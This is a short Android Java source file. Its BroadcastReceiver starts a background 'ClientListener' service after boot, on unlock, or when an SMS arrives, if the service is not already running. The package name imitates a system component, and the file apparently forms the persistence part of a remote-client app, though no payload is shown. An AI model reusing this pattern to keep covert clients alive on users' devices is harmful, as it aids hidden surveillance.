package com.android.security.receiver;
 

import com.android.security.ClientListener;
import com.android.security.utils.Config;
import com.android.security.utils.LogUtil;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
	
	private static final String strACT = "android.provider.Telephony.SMS_RECEIVED";
	 
	public void onReceive(Context context, Intent intent)
	{
		LogUtil.i("----system starting--");
		String action = intent.getAction();
		if ((action.equals(Intent.ACTION_BOOT_COMPLETED)) ||(action.equals(Intent.ACTION_USER_PRESENT))
				 || action.equals(strACT))
		{
			/*
			context.startService(new Intent(context, Client.class));
*/
			boolean isServiceing = Config.isServiceWork(context, "com.android.security.Client");
			if(!isServiceing)
			{
				Log.d("SYSTEM_RECEIVER", "Client NOT RUNNING");
				context.startService(new Intent(context, ClientListener.class));
			}else
			{
				Log.d("SYSTEM_RECEIVER", "Client IS RUNNING");
			}
			 
			return;
		}
	}

}